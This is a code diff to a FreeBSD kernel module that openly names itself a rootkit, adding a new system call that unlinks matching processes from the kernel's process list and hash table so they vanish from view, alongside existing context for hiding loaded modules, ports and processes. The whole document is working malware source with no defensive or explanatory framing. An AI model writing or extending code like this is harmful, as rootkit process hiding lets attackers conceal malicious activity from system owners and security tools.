@@ -421,6 +421,45 @@ static struct sysent proc_hiding_sysent = {
 };
 static int proc_hiding_offset = NO_SYSCALL;
 
+struct process_hiding_args {
+    char *name;
+};
+
+static int process_hiding(struct thread *td, void *syscall_args) {
+    struct proc *p;
+    struct process_hiding_args *uap;
+    uap = (struct process_hiding_args *) syscall_args;
+
+	sx_xlock(&allproc_lock);
+
+	FOREACH_PROC_IN_SYSTEM(p) {
+		PROC_LOCK(p);
+
+		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
+			PROC_UNLOCK(p);
+			continue;
+		}
+
+		if (strstr(p->p_comm, uap->name)) {
+			LIST_REMOVE(p, p_list);
+			LIST_REMOVE(p, p_hash);
+		}
+
+		PROC_UNLOCK(p);
+	}
+
+	sx_xunlock(&allproc_lock);
+	return 0;
+}
+
+static struct sysent process_hiding_sysent = {
+    .sy_narg   = 1,
+    .sy_call   = (sy_call_t *)process_hiding,
+    .sy_auevent = AUE_NULL
+};
+
+static int process_hiding_offset = NO_SYSCALL;
+
 static int load(module_t module, int cmd, void *arg) {
     (void)module;
     (void)arg;
@@ -523,3 +562,4 @@ DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, NULL, NULL);
 SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, NULL, NULL);
 SYSCALL_MODULE(proc_hiding, &proc_hiding_offset, &proc_hiding_sysent, NULL, NULL);
+SYSCALL_MODULE(process_hiding, &process_hiding_offset, &process_hiding_sysent, NULL, NULL);
